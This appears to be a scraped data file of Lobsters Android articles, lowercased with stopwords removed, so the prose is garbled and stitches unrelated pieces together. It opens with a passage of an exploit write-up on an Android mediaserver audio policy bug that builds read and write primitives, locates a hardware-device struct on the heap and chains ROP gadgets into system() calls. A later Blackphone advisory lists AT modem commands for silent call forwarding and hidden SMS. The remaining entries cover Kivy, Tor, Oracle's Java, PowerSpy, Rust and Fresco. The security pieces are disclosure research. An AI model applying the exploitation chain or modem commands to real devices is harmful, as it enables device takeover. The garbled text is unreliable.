functionality provided audiopolicyservice functionality provided audioflinger fact handled single class audiopolicymanagerbase result class going focusing limited write primitive whenever user would like start output stream particular output device front back speaker may calling startoutput function provided audio policy service function receives three argument output descriptor must device front back speaker type stream output opened one predefined stream type session id number corresponding previously opened session initially function verifies output parameter fetching audiooutputdescriptor object corresponding given output device mean argument must fact valid two argument well peering little reveals following call nt seem shady let make sure stream argument safely handled oh see function us stream argument index array value within audiooutputdescriptor object read writes address without ever sanitizing stream number good start already reality handful valid streamtype value fact enumerated type adding appropriate validation easy checking given argument within enumeration minimal maximal value regardless still constraint need figure first foremost order avoid unnecessary sideeffects would like choose output descriptor duplicated execute first block luckily easy output descriptor fact duplicated default moving would second block function execute well since delta argument always mean enter block iff int mrefcount stream negative meaning value pointed larger equal since dealing system happen actual value would logged system log info leak would zeroed returning function although nice infoleak two obvious downside another one wo nt cover post reading leaked value requires readlogs permission originally stated would like start zero permission value read corrupted could troublesome quite exploitation technique definitely lost still create much stronger primitive using vulnerability assuming second block executed arrive function end target value incremented one limited write primitive note final log statement actually included release build since alogv empty macro build putting together get write primitive allowing u increment value mrefcount stream one long larger equal spy little eye write primitive let look read primitive also since write primitive relative audiooutputdescriptor object dynamically allocated therefore located rather unpredictable location heap would much convenient able find primitive also relative audiooutputdescriptor object pouring audiopolicymanagerbase method reveals tempting target audiopolicymanagerbase isstreamactive method method allows user query given stream order check active output descriptor within usersupplied timeframe method performs validation given stream argument perhaps validation delegated internal audiooutputdescriptor isstreamactive method nope lucky access mrefcount member audiooutputdescriptor using stream argument index performing validation whatsoever see two case function would return true mrefcount stream otherwise time difference current system time value mstoptime stream le usersupplied argument inpastms since would like use vulnerability easy read primitive would first seek eliminate sideeffects crucial would make actual exploit much easier build much modular however simply passing argument inpastms value ie intmin would cause last statement always evaluate false since integer smaller intmin leaf u simple clean albeit somewhat weak read primitive function isstreamactive return true iff value mrefcount stream zero since stream argument fully controlled u use scan memory relative audiooutputdescriptor object gage whether contains zero dword thermal vision point might wondering even call readprimitive possible information learn using vulnerability whether value given address zero glad kindof asked fact enough u find way around heap instead thinking term heap memory let use imagination secret agent mission standing behind closed door leading room need enter naturally turn thermal vision goggles course goggles present following image safe see dog let look image really need heat information example information given pixel hot still definitely recognizable outline dog allowed u create heat signature could use identify dog using thermal goggles heap memory let say value memory nonzero hot otherwise memory location cold using readprimitive create form thermal vision goggles like pair imagined minute ago remains seen whether create good heat signature object interested first looking histogram full memory dump heap mediaserver process reveals value zero far common moreover typical heap object appear many zero within leading interesting repeatable pattern heatmap generated aforementioned heap dump looking binary heatmap see still many interesting pattern use try understand object observing hopefully convinced move building actual exploit building exploit established two tool belt increment value long lower inspect memory location order check contains value zero order take one step would nice able find object distinct heatsignature also contains pointer function call using regular api call pas controllable argument searching around bit reveals prime candidate exploitation audiohwdevice structure holding many function pointer implementation function provided actual audio hardware device part audio hardware abstraction layer moreover function pointer also triggered ease simply calling different part audio policy service audio flinger apis however make object especially interesting structure begin header fixed length initialized nonzero value contains large block reserved value initialized zero followed large block function pointer second one initialized zero mean audiohwdevice object quite unique heat signature easily find object great let sketch gameplan search audiohwdevice using heat signature create stronger read primitive using existing primitive create stronger write primitive using existing primitive using new primitive hijack function execute arbitrary code already seen search audiohwdevice using heat signature mentioned creating new primitive harder better faster stronger primitive order would like hijack function within audiohwdevice structure following property easily trigger call function invoking external api call function return value returned user argument function completely usercontrolled reading different api call arrive perfect candidate audioflinger getinputbuffersize see audioconfig structure populated using userprovided value passed audio hardware device implementation getinputbuffersize mean find audiohwdevice modify getinputbuffersize function pointer point gadget would like execute whichever value return gadget simply returned user creating primitive first would like find real memory address audiohwdevice structure useful case would like pas pointer location within object later stage exploit quite easily accomplished using weak write primitive order increment value getinputbuffersize function pointer point bx lr gadget ie instead performing operation function simply return since first argument provided function pointer audiohwdevice structure mean stored register according arm calling convention upon executing crafted return statement value returned value namely pointer audiohwdevice address audiohwdevice would like also read address within one loaded library necessary able calculate absolute location loaded library gadget within however seen audiohwdevice structure contains many function pointer point text segment one loaded library mean reading function pointer sufficient u learn location loaded library moreover since getinputbuffersize function receives audiohwdevice first argument search gadget read value offset fall within function pointer block range return many gadget simply chose one point know location audiohwdevice loaded library left create arbitrary write primitive since three usercontrolled value inserted structure passed second argument getinputbuffersize use advantage pas value corresponding wanted write address value first two argument function get packed first two value audioconfig structure search unique gadget unpacks two value writes crafted value wanted location return seems like lot ask searching multitude gadget appears gadget libcameraclientso mean increment getinputbuffersize function pointer point gadget passing wanted value audioflinger getinputbuffersize function write value absolute address within mediaplayer process virtual address space liftoff primitive need need put piece together create exploit call system function within mediaserver process address audiohwdevice library address along arbitrary write primitive prepare argument system function call anywhere within mediaserver virtual address space good scratch pad candidate would reserved block within audiohwdevice since already know absolute memory location leaked address audiohwdevice also know overwriting area wo nt negative sideeffects using write primitive write path would like call system reserved block along address system function calculate since leaked library load address use write primitive change getinputbuffersize function pointer one final time time would like point gadget would unpack function address argument written reserved block would execute function using argument gadget found libstagefrightso code execution within mediaserver process small diagram recapping total exploit flow full exploit code always like provide full exploit code covered blog post get http gadget collected android version obviously adjusted whichever android version would like run exploit android highly recommend download look exploit source code many nuance cover blog post brevity sake stage exploit heavily documented fun timeline vulnerability disclosed google notified android security team written full exploit sent query google regarding current fix status got response stating patch rolled upcoming version sent another query google got response stating fix status changed sent third query google got response saying patch pushed android
397,Lobsters,android,Android,A Web Developer Builds a Kivy App,http://mattscodecave.com/posts/a-web-developer-builds-a-kivy-app.html,web developer build kivy app,web developer build kivy app bottom kivy github repo web framework scientific informationsecurity system administration kivy start kivy interactive application game python like one one mailing list experience netcat kivy designer twisted kivy documentation inclement commented,web developer build kivy app published updated comment kivy core dev bottom web developer eat sleep breathe server client one day found could run lovely python code android using kivy decided write application allow android device send receive binary data local network something like netcat android imaginatively called andcat currently available github repo eager share experience python community turned much better expected kivy represents variety present python community everything web framework scientific informationsecurity system administration tool many programming language community boast multidisciplinary streak kivy kivy crossplatform python framework nui development nui stand natural user interface mean interface exposed user get way require learning simpler term kivy framework developing graphical interface work well following platform android io window linux osx mean python community top creating web application machine learning model also create desktop mobile application start zero knowledge developing anything mobile platform decided get roberto ulloa book kivy interactive application game python understand kivy framework get glimpse work wholly alien platform roberto ulloa great job book consists project get hand dirty actually build something example roberto teach u think graphical application reason placing graphical object certain place move place tie event happen object running backend code much every developer need help especially starting kivy documentation detailed well structured includes many example tackle related topic building application android io integrating twisted despite overwhelming get answer looking quickly doc ca nt answer question kivy community active produce lot reading material many blog like one one deal arcane situation come mailing list gather really unique problem kind problem maybe five people ever bump two developer know answer ca nt judge irc channel nt used however static source always recommend may also mean nt found problem could nt solve help documentation mailing list may also mean project simple experience mentioned decided make android version netcat found simple tool transfer larger file android device ssh application offer scp support well ftp server solution felt overly complicated also wanted able easily transfer file linux computer easier way netcat andcat natural extension knowledge presented book read reusing idea guideline picked practice project also decided cut scope much possible focus functionality using alldefault styling assembling interface manually instead relying industrialstrength tool like kivy designer biggest difference developing web developing mobile new runtime environment browser finicky beast full surprise every developer learns deal web developer learn solve problem appear user browser inside browser browser server mobile completely different browser general interface give number input touch screen camera sensor etc output screen speaker vibrator web developer dream feel complicated first compared web development middleman form browser one le moving part keep back mind kivy whole lot heavy lifting chosen extend kivy rich collection building block way working block include everything layout grid button file selector plugged application event loop getting element respond event simple defining properly named function one element class customtextinput textinput def onfocus self instance value define happens focus event fired kivy come kv language similar yaml provides way declare element look behave also enables developer nest element mean possible use kv declare whole layout button image whatnot used kv describe filereceivingscreen look like user define screen contain grid layout layout contain element andcatlogo andcatiplabel andcatportinput others element additional attribute size case label text check kivy recvfile gridlayout col row andcatlogo andcatiplabel text current ip format rootparentmanagerownip textsize selfwidth none sizehint andcatportinput id recvport multiline false text port value sizehint snip kivy plain python thanks learning curve shallow possible build decent application matter hour normal python object loop function nothing exotic added benefit ca nt find something documentation rummage kivy source code pythonic easy understand one issue fence testing used building suite test clue test kivybased application found satisfying way isolate business logic want test working framework furthermore ca nt imagine test gui using twisted handle networking easy test integrated testing framework however due way twistedbased portion code integrate kivybased portion figured properly test found kivy documentation topic due lack graphic knowledge nt able make use maybe gentle introduction would help newbie miss something one final gotcha long start time first time around launch andcat gen moto x start take second subsequent start ups take second read may related running lot code initialization file aka mainpy certainly related firing python interpreter android device ca nt find source also read worked change near future summary kivy give developer ability create great application picking kivy simple thanks pythonic nature lot learning support material thanks active community minor gotchas smoothed experience definitely putting kivy toolbox looking forward using project release andcat next day inclement commented reddit thread valuable info testing start speed really appreciate nice app glad good experience kivy one issue fence testing used building suite test clue test kivybased application discussion love good solution including kivy extensive gui test sure conclusion reached beyond current relatively basic one interested might worth querying mailing list irc case someone something good working one final gotcha long start time first time around launch andcat gen moto x start take second subsequent start ups take second never properly benchmarked suspect long time depend strongly slow internal memory particularly extraction long app nt unnecessarily big nt probably nt much startup later time included first time preguistart python code make difference timing comparable maybe little worse nexus slow like cause probably ca nt improve much modifying app code likely significantly better newer device lg startup one thing try build app instead pygame backend nexus observed noticeable improvement startup time first run trivial app newer device difference nt seem significant possibly much faster anyway nt know really bottleneck possible could help using possible new pythonforandroid toolchain nt yet buildozer backend though one developer working one
399,Lobsters,android,Android,Adding Tor support [to Facebook] on Android,https://www.facebook.com/notes/facebook-over-tor/adding-tor-support-on-android/814612545312134/,adding tor support facebook android,http wwwfacebookcorewwwionion connect facebook securely orbot proxy app google play fdroid repository orbot proxy tor facebook tor page,created tor onion address http wwwfacebookcorewwwionion make easier people connect facebook securely torenabled browser change increased security tor connection facebook eliminating step required traffic travel beyond cryptographic assurance provided tor networksince sizeable community people grown use feature help u make efficient reliable commonly receive request additional platform support beyond browser thanks project initiated summer intern facebook subsequently picked protect care team london offering experimental support using facebook tor via orbot proxy app android deviceswe releasing feature next day seek feedback help u create great experience using facebook tor android get started head google play orbot fdroid repository download orbot proxy tor new preference switchafter installing orbot visit facebook app setting menu enable feature using new preference switch information update posted facebook tor pageandroid engineering facebook tor provided facebook london protect care team thanks especially shackleton nick tuckett rahul parsani hard work thanks also guardian project orbot tor project
400,Lobsters,android,Android,Oracle sinks its claws into Android,http://andreasgal.com/2016/01/05/oracle-sinks-its-claws-into-android/,oracle sink claw android,commit google create java clone apache v gpl proprietary bionic licensing apache lgpl competitive moat update lawsuit open jdk openjdk swing service rough year ahead already month ago winner loser like,first blog post since leaving role mozilla cto month ago may read press good chunk original firefox o founding team moved mobile created startup work cool product technology internet thing hear next month longer working directly mobile curious event got attention commit appeared android code base indicates google abandoning reimplementation java favor oracle original java implementation try explain think huge change farreaching implication android android ecosystem google create java clone run java app need runtime library written java called java standard class library implement basic language construct like hash table string since early day android use sun version java standard class instead android team enhanced open source apache harmony java standard library harmony independent clean room opensource implementation java standard library maintained apache foundation basically technical advantage using harmony strictly le complete le correct version sun original implementation android invest effort duplicate sun open source java standard class apache v gpl course android meteoric rise power behind android demonstrated deep strategic understanding different class open source license strength weakness android early day successfully used open source license enable proprietary technology sound counterintuitive explains google rewrote much open technology android java actually major open technology piece google reinvented since android google us bionic standard c library strong technical reason use bionic open source alternative gnu libc quite contrary mozilla earlier day android constantly fight deficiency bionic comparison existing open source standard c library famously bionic thread safe many case crashing multithreaded application writing standard c library scratch crazy one commoditized piece software almost impossible significantly better existing implementation cost ton time money compatibility huge pain google anyway simple answer licensing bionic google java implementation licensed nonviral apache apl license use modify apl code without publish change word make proprietary change improvement possible gnu libc lgpl pretty sure know google thought important part launching firefox o talked many chipset vendor oems google work silicon vendor oems like differentiate software level trying improve android code stack especially silicon vendor often modify library code take advantage proprietary silicon want share change world competitive proprietary advantage google rewrote bionic java standard class silicon vendor oems probably demanded part android open ironic use word context sort proprietary approach update bob lee worked google time commented openjdk exist yet android launched google use openjdk back gnu classpath lgpl exist since however google still chose harmony stuck even apache abandoned harmony project switch clearly driven oracle v google lawsuit open jdk openjdk name oracle java obtain viral open source license strong protection change openjdk published source code except oracle oracle mean control java beyond source code openjdk open prison vote high wall even help build wall ever forced walk oracle alone decided whether leave oracle owns much roadmap openjdk via compatibility requirement trademark existing agreement api copyright lawsuit oracle v google oracle pretty much full control openjdk headed mean android short new sheriff town app ecosystem heart every mobile o made android io successful made firefox o struggle app ecosystem rest app stack android case harmony past going forward openjdk word oracle least one hand steering wheel well anyone guess oracle google oracle long history getting along going quite curious watch java aim platform similarly vast scope android java includes user interface ui library swing example google course android ui framework swing sit every android phone using resource unlikely oracle try force google actually use swing google make sure work present apps use oracle easily force google include pretty much code service plea oracle java push notification specified operated oracle oracle add openjdk make way android google oracle hamster wheel rough year ahead short term google biggest challenge rip harmony replace openjdk actually working seems project started secret already month ago merged public repository code technology churn massive implication android tactical level literally million line code changing new openjdk implementation often subtly different correctness performance behavior harmony code google used previously see google updating test specific boundary condition date handling harmony different behavior oracle openjdk test fixed app ecosystem run top shifting sand android app store million apps rely java standard class test fixed apps randomly break due subtle change openjdk transition brings breakage limited correctness performance variance even harder track past performance workarounds obsolete hard tell one entirely new performance problem pop fun course licensing changing see core android ecosystem runtime powered library code copyright oracle also hard time imagining android n coming time magnitude change happening behind scene google changing engine midflight top priority crash much time worry arriving schedule winner matter look huge victory oracle oracle never much mobile game sudden oracle gained good amount roadmap technology influence important mobile ecosystem scale oracle mobile titan see one coming loser google silicon vendor entire middle part android stack subject proprietary oracle control google call reduced fragmentation press release true kind le fragmentation oracle control anything java including android silicon vendor still allowed proprietary enhancement obtain library code difference nonviral license oracle fee oracle actually already history upselling openjdk offering certain component java vm royalty payment get basic garbage collector free want really good one cost expect oracle attempt monetize similar way billion mobile user stumbled upon like like loading related
401,Lobsters,android,Android,PowerSpy: Location Tracking Using Mobile Device Power Analysis,https://crypto.stanford.edu/powerspy/,powerspy location tracking using mobile device power analysis,powerspy location tracking using mobile device power analysis usenix security website powerspy location tracking using mobile device power analysis http bitbucketorgymcrcatpowerspy powerspy app yan michalevsky gabi nakibly aaaron schulman dan boneh,powerspy location tracking using mobile device power analysis modern mobile platform like android enable application read aggregate power usage phone information considered harmless reading requires user permission notification show simply reading phone aggregate power consumption period minute application learn information user location aggregate phone power consumption data extremely noisy due multitude component application simultaneously consume power nevertheless using machine learning algorithm able successfully infer phone location discus several way privacy leak remedied video full talk full paper usenix security website usenix security symposium usenix security local copy powerspy location tracking using mobile device power analysis git repository bitbucketorg http bitbucketorgymcrcatpowerspy repository contains android application matlab code download android application obtaining sample required experiment powerspy app android application source code found main directory built using eclipse ant build using ant build system simply go main directory run ant debug realtime tracking following animation demonstrates realtime tracking attack animation rendered using javascript google map api us real experimental data contributor yan michalevsky gabi nakibly aaaron schulman gunaa arumugam veerapandian dan boneh
404,Lobsters,android,Android,Vulnerability in Blackphone Puts Devices at Risk for Takeover,https://www.sentinelone.com/blog/vulnerability-in-blackphone-puts-devices-at-risk-for-takeover/,vulnerability blackphone put device risk takeover,blackphone red naga timeline special thanks,modem flaw expose encrypted device hacking blackphone generally considered secure smartphone available today unfortunately matter secure system designed remains vulnerable security flaw recently discovered vulnerability could allow attacker remotely control phone modem function developed sgp technology wholly owned subsidiary silentcircle blackphone provides user control app permission bundled silent phone silent text service anonymise encrypt communication one eavesdrop voice video text call part reverse engineering exercise prepare red naga training session discovered socket left open accessible blackphone email protected devsocket l l atpal srwrwrw radio system atpal almost mention socket anywhere internet except filecontexts used selinux android appeared nvidia shield tablet android device seems used wild icera modem since abandoned nvidia dug deeper found application interact socket specifically agpsdaemon elevated privilege normal shellapp user since systemradio user prior reversing anything looking system log see agpsdaemon reveals interesting detail iagpsd agpsportparseargs getting property environment iagpsd agpsportparseargs getting property agpsdsocketpathdevsocketatpal environment dagpsd kernel time dagpsd vendornvidiategraprebuiltceres icerarilagpsdagpsdaemonc version dagpsd vendornvidiategraprebuiltceres icerarilagpsdagpsdaemonc built dec dagpsd agpsuplinkthread entering iagpsd openttyport opening iagpsd agpsdownlinkthread entering according log appears nvidia icera modem binary listening socketpath devsocketatpal also opening ttyport open agpsdaemon ida pro quickly confirmed see privileged process listens atpal socket writes anything received socket port looking around binary also see port listened radio mean found way talk directly modem easily confirm work actually running agpsdaemon command line shell since see test thread left inside code running binary command line see fake command sent modem would allow attacker either run shell user send command radio potentially android application internet permission send command radio since command began looked like modified hayes command began googling combination code might interesting use time pulled file device started grepping style code found binary systembinfild appears open socket also load shared library file systemliblibicerarilso digging two binary found usable code without much effort including following interesting code atcmut set modem muted prevents ringing atd set called id enabled outgoing call atcmgt atcmgs send sm visible android device atccfc set call forwarding device prevents incoming call showing atcscs atcusd send ussd code along code many seem standardized perform visible action investigation able find additional code path would allow attacker send receive text message get passed main android ui noticeable user way dial connect call apparent user ui dialog pop however often lead freezing noncancellable call must hung via modem interaction check state phone call silently number call connected incoming outgoing reset apnsmscpower setting force conference call number mute modem speaker forceunforce caller id setting kill modem hard reboot required restore modem find neighboring cell tower connected silently register call forwarding number blackphone notice call incoming incoming caller notified forwarding likely method bothered enumerating code look potentially exploitable validated finding requested cve contacted silentcircle requested submit issue bugcrowd issue assigned fixed bugcrowd bug bounty silentcircle vulnerability illustrates breadth depth attack surface device also raise important consideration security professional first even secure system vulnerable attack second increasing proportion third party technology hardware driver software library etc used today device make detecting remediating flaw difficult ever finally virtually vulnerability require form malware order remotely exploited monitoring process device provide important layer detection response apparently legitimate request perform system function originate anomalous source timeline contact vendor vendor request going bugcrowd issue submitted via bugcrowd cve requested issue triaged bugcrowd issue assigned via mitre cert vendor acknowledges accepts submission issue marked resolved awarded vendor patch issue patch released including fix issue special thanks caleb fenton jacob soo jon sawyer red naga proper assisting developing red naga training material led discovery netsecrex cso silentcircle continually checking disclosure process keeping going kymberlee price bugcrowd assisting disclosing issue
405,Lobsters,android,Android,Compiling Rust to an Android Target,http://ghotiphud.github.io//rust/android/cross-compiling/2016/01/06/compiling-rust-to-android.html,compiling rust android target,multirust use multirustrs cargo multirustrs stable beta nightly stable new crate setting crosscompiler info armlinuxandroideabi note update ruststdnightlyarmlinuxandroideabiruststdarmlinuxandroideabilibrustlibarmlinuxandroideabi linker error androidglue apkbuilder crosscompiling android eabi testing actually worked working,multirust use post started life exploration crosscompiling point become intro using multirustrs cargo simplify thing considerably get fun android part stick first thing installed multirust go get done multirustrs see back minute go ahead start running multirust update depending connection speed step may take download stable beta nightly compiler http staticrustlangorgdist need keep url mind bit see pop later next thing want setup default toolchain multirust default stable choose use stable default seems like decent default might well stick blessed compiler version adding override later need nightly crosscompiling android way move running something new crate cargo new bin androidtest cd androidtest set new executable crate targetting android honestly want develop logic emulator phone hardware fiddling adb whole time know ide integration would make le pain thing still much slower test cycle time directly linked productivity let efficient point able run cargo run see nice hello world beautiful setting crosscompiler going cheat bit compile arm version android opposed atom version hey majority device arm servo even support yet atom device test maybe update later end testing onward lucky u rust build top llvm crosscompiler default make thing fairly smooth needed specify architecture compiling cargo buildruntest default pick current architecture target cargo build equivalent cargo build machine experience may vary info armlinuxandroideabi target android arm device may thinking cargo build targetarmlinuxandroideabi away go hold horse would awesome worked quite smooth cargo build targetarmlinuxandroideabi verbose well give u nice error message process nt exit successfully rustc cratename cratetype dylib cratetype bin printfilenames target armlinuxandroideabi exit code stderr error error loading target specification could find specification target armlinuxandroideabi need specification target armlinuxandroideabi get one consulting friendly expert rust irc channel found meant needed stdlib compiled target armlinuxandroideabi well could build rust standard library armlinuxandroideabi configure targetarmunknownlinuxgnueabihf make j nproc sudo make install would take hr compilation lack amount detail trying kill time heat house something remember mentioned http staticrustlangorgdist earlier well bit sleuthing find dated folder contains rust tarballs desktop architecture kindly build gnome produced android std libs well conveniently exactly thing need one caveat writing android build seem nightlies okay long match compiler version android std version fine picked date base toolchain mostly likely use whatever newest nightly build time note nightlies built updating post tried failed compile rustcserialize buyer beware update rustcserialize need updated latest version work nightlies thanks go correction enjoy working latest greatest without ado multirust make simple thing set multirust override download http unzip find folder ruststdnightlyarmlinuxandroideabiruststdarmlinuxandroideabilibrustlibarmlinuxandroideabi copy congrats crosscompiler linker error let try compilation android cargo build targetarmlinuxandroideabi verbose compiling androidtest file mntstoragedevandroidtest running rustc srcmainrs cratename androidtest cratetype bin g outdir mntstoragedevandroidtesttargetarmlinuxandroideabidebug emitdepinfo link target armlinuxandroideabi l dependencymntstoragedevandroidtesttargetarmlinuxandroideabidebug l dependencymntstoragedevandroidtesttargetarmlinuxandroideabidebugdeps error linking cc failed exit code compiler worked linker making thing luckily androidglue contains apkbuilder substitute linker create cargoconfig file mkdir p cargo echo targetarmlinuxandroideabi linker apkbuilderapkbuildertargetreleaseapkbuilder cargoconfig add apkbuilder git clone http githubcomtomakaandroidrsglue apkbuilder cd apkbuilderapkbuilder cargo update cargo build release cd apkbuilder depends upon android sdk ndk need well first need android development tool like ndk sdk toolchain crosscompiling android ndk downloaded http developerandroidcomndkdownloadsindexhtml android sdk downloaded http developerandroidcomsdkindexhtml install ndk sdk refer guideline website install sdk run ui tool toolsandroid update sdk order install full set android library may use platform commandline may also toolsandroid update sdk noui first create android toolchain ndk example command setup standalone android tool chain ndk rootbuildtoolsmakestandalonetoolchainsh platform installdirdir install ndkdirndk dir archarm set following environment variable building may want export configuration file like bashrc androidsdk pathtosdk androidndk pathtondk androidtoolchain pathtotoolchain path path androidtoolchainbin add toolchain path debian ubuntu may need install package sudo aptget install curl ant ubuntu may need sudo aptget install curl ant osx install package crosscompiling android eabi note added android variable bashrc following command assume done ready go androidhome androidsdk ndkhome androidndk ndkstandalone androidtoolchain cargo build targetarmlinuxandroideabi compiling androidtest file mntstoragedevandroidtest kind testing actually worked apk actually tradition typical programming example writing hello world first add dependency androidglue cargotoml targetarmlinuxandroideabidependenciesandroidglue version add extern crate androidglue invoke androidstart main crate cfg targetos android macrouse extern crate androidglue cfg targetos android androidstart main fn main println hello world rust recompile deploy emulator androidhome androidsdk ndkhome androidndk ndkstandalone androidtoolchain cargo build targetarmlinuxandroideabi release need apk extension adb complain cd targetarmlinuxandroideabirelease mv androidtest androidtestapk adb install r androidtestapk run app launching emulator adb logcat see line similar rustandroidgluestdouterr entering androidmain rustandroidgluestdouterr created application thread rustandroidgluestdouterr hello world rust working thanks sticking far got much longer intended may continue investigating without immediate use work might hang shall see side note really enjoying exploring rust community great first foray system programming coming netc focussed day job remarkably smooth recommend taking leap anyone inclination farewell
406,Lobsters,android,Android,Android++ (native development and debugging for Visual Studio) is now open-source,https://github.com/webbju/android-plus-plus,android native development debugging visual studio opensource,join github today sign file permalink http wwwandroidpluspluscom resource license reload reload,android native development debugging solution visual studio dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time android freely distributed extension associated msbuild script designed enable android application development within visual studio primarily ndk based cc application also incorporates customisable deployment resource management integrated java source compilation http wwwandroidpluspluscom versioning changelist info refer docschangestxt new android need help installing please read docsgettingstartedtxt copyright c naturalmotion limited used licence code written justin webb licence granted justin webb permission naturalmotion limited right granted naturalmotion limited licence naturalmotion limited party licence obligation liability licence software provided asis without express implied warranty event author copyright owner held liable damage arising use software otherwise connection software permission granted anyone use software purpose including commercial application alter redistribute freely subject following restriction origin software must misrepresented must claim wrote original software use software product acknowledgment product documentation would appreciated required altered source version must plainly marked must misrepresented original software notice may removed altered source distribution thank support justin webb webbju androidpluspluscom android native development debugging solution visual studio resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
407,Lobsters,android,Android,"Sun, Oracle, Android, Google and JDK Copyleft FUD",http://ebb.org/bkuhn/blog/2016/01/05/jdk-in-android.html,sun oracle android google jdk copyleft fud,creative common attributionshare alike united state license bradley kuhn bkuhn ebborg,website document licensed creative common attributionshare alike united state license include stddisclaimerh use standard disclaimer standard import disclaimer select fulltext standard type disclaimer previously presently employed andor done work various organization also view free libre open source software blatantly obvious website please assume view opinion belong organization since coown ebborg wife may obvious nt view opinion either bkuhn ebb service mark bradley kuhn bradley kuhn bkuhn ebborg
408,Lobsters,android,Android,Google confirms next Android version won’t use Oracle’s proprietary Java APIs,http://venturebeat.com/2015/12/29/google-confirms-next-android-version-wont-use-oracles-proprietary-java-apis/,google confirms next android version use oracle proprietary java apis,openjdk jdk hacker news android n development apps java programming language code commit java lambda oracle android use java apis without permission google infringe oracle patent coincidence existing android version update december,google replacing implementation java application programming interface apis android openjdk open source version oracle java development kit jdk news first came mysterious android codebase commit last month submitted hacker news google confirmed venturebeat android n rely openjdk implementation rather android implementation java apis opensource platform android built upon collaboration opensource community google spokesperson told venturebeat upcoming release android plan move android java language library openjdkbased approach creating common code base developer build apps service google long worked contributed openjdk community look forward making even contribution openjdk project future android provides certain java api library support development apps java programming language broken two part apis library implementing code developed google make said library work oracle develops java two implementation library proprietary jdk version open source openjdk version google decision consolidate effort openjdk mean moving away implementing code oracle opensource code code commit question show file changed clearly note openjdk code added android initial import openjdk file create new libcoreojluni directory srcmainjava srcmainnative subdirectiories build ojluni coreoj jar use openjdk class javaawtfont package copy file jdksrcshareclasses jdksrcsolarisclasses directory openjdk libcoreojlunisrcmainjava copy following native file openjdk libcoreojlunisrcmainnative long list file one commit google committed several hundred change opensource repository relation adopting openjdk google hoping android developer appreciate change simplifies code build apps common codebase java api library opposed multiple codebases may true reason google made complete switch openjdk company would done year ago asked google company pointed release java last year introduction new language feature lambda google want put resource openjdk team bigger impact new feature improvement developer story google pitching case massive legal narrative forgotten oracle hacker news user rightly wondering whether code commit mean legal dispute oracle google settled court whether google decided protect regard future android version event loses good question oracle lawsuit ongoing google declined comment whether code commit related acquiring sun january oracle sued google copyright patent infringement august arguing android use java apis without permission google countered declaring apis copyrighted essential software development collaboration innovation may jury found google infringe oracle patent adding java apis copyrighted may federal circuit partially reversed district court decision ruling oracle favor java apis copyrighted june u supreme court declined hear case sent back lower court google could argue made fair use oracle copyrighted apis coincidence back forth google decided embrace openjdk unlikely end result matter future version android based openjdk implementation oracle currently issue either way case google exactly change existing android version final decision still watched closely could huge impact software development whole oracle win tech giant could hold lot power developer creating new software based existing apps service google win fair use law could essentially protect use apis update december google followed today clarify detail company explained u wrote article result headline corrected accurately reflect story google moving away implementation using apache harmonybased library use openjdk library foundation standard java library company still making change openjdk make work android result future version android continue contain part google implementation based openjdk oracle declined comment article
409,Lobsters,android,Android,Introducing Fresco: A new image library for Android,https://code.facebook.com/posts/366199913563917/introducing-fresco-a-new-image-library-for-android/,introducing fresco new image library android,region memory heap heap purgeable bitmap advises using feature cake eating function precisely write code java think like c loader picasso universal image loader glide volley stop worrying love streaming reactivex rxjava animation one many love thee let drawee way fresco open source,displaying image quickly efficiently facebook android important yet many problem storing image effectively year image large device small pixel take byte data one red green blue alpha phone screen size x pixel single fullscreen image take mb memory phone often little memory android device divide memory among multiple apps device facebook app given little mb one image could take tenth happens app run memory crash set solve creating library calling fresco manages image memory use crash begone region memory understand facebook need understand different heap memory available android java heap one subject strict perapplication limit set device manufacturer object created using java language new operator go relatively safe area memory use memory garbagecollected app finished memory system automatically reclaim unfortunately process garbage collection precisely problem basic reclamation memory android must halt application completely carry garbage collection one common cause app appearing freeze stall briefly using frustrating people using app may try scroll press button see app wait inexplicably responding contrast native heap one used c new operator much memory available app limited physical memory available device garbage collection nothing slow thing however c program responsible freeing every byte memory allocate leak memory eventually crash android another region memory called ashmem operates much like native heap additional system call android unpin memory rather freeing lazy free memory freed system actually need memory android pin memory back old data still freed purgeable bitmap ashmem directly accessible java application exception image one create decoded uncompressed image known bitmap android api allows specify image purgeable bitmapfactoryoptions new bitmapfactoryoptions optionsinpurgeable true bitmap bitmap bitmapfactorydecodebytearray jpeg jpeglength option purgeable bitmap live ashmem however garbage collector automatically reclaim android system library pin memory draw system rendering image unpin finished memory unpinned reclaimed system time unpinned image ever need drawn system decode fly might seem like perfect solution problem onthefly decode happens ui thread decoding cpuintensive operation ui stall carried reason google advises using feature recommend using different flag inbitmap however flag exist android even useful unless image app size definitely case facebook android limitation removed however needed solution would work everyone using facebook including running android cake eating found solution allows u best world fast ui fast memory pinned memory advance ui thread made sure never unpinned could keep image ashmem suffer ui stall luck would android native development kit ndk function precisely called androidbitmaplockpixels function originally intended followed call unlockpixels unpin memory breakthrough came realized called lockpixels without matching unlockpixels created image lived safely java heap yet never slowed ui thread line c code home free write code java think like c learned spiderman great power come great responsibility pinned purgeable bitmap neither garbage collector ashmem builtin purging facility protect memory leak truly c usual solution build smart pointer class implement reference counting make use c language facility copy constructor assignment operator deterministic destructors syntactic sugar exist java garbage collector assumed able take care everything somehow find way implement cstyle guarantee java made use two class one simply called sharedreference two method addreference deletereference caller must call whenever take underlying object let scope reference count go zero resource disposal bitmaprecycle take place yet obviously would highly errorprone require java developer call method java chosen language avoid top sharedreference built closeablereference implement java closeable interface cloneable well constructor clone method call addreference close method call deletereference java developer need follow two simple rule assigning closeablereference new object call clone going scope call close usually finally block rule effective preventing memory leak let u enjoy native memory management large java application like facebook android messenger android loader pipeline many step involved showing image mobile device several excellent open source library exist perform sequence picasso universal image loader glide volley name made important contribution android development believe new library go several important way thinking step pipeline rather loader make difference step independent others possible taking input parameter producing output possible operation parallel others serial execute specific condition several particular requirement thread execute moreover entire picture becomes complex consider progressive image many people use facebook slow internet connection want user able see image quickly possible often even image actually finished downloading stop worrying love streaming asynchronous code java traditionally executed mechanism like future code submitted execution another thread object like future checked see result ready however assumes one result dealing progressive image want entire series continuous result solution generalized version future called datasource offer subscribe method caller must pas datasubscriber executor datasubscriber receives notification datasource intermediate final result offer simple way distinguish often dealing object require explicit close call datasource closeable behind scene box implemented using new framework called producerconsumer drew inspiration reactivex framework system interface similar rxjava appropriate mobile builtin support closeables interface kept simple producer single method produceresults take consumer object consumer turn onnewresult method use system like chain producer together suppose producer whose job transform type type would look like public class outputproducer implement producer private final producer minputproducer public outputproducer producer inputproducer thisminputproducer inputproducer public void produceresults consumer 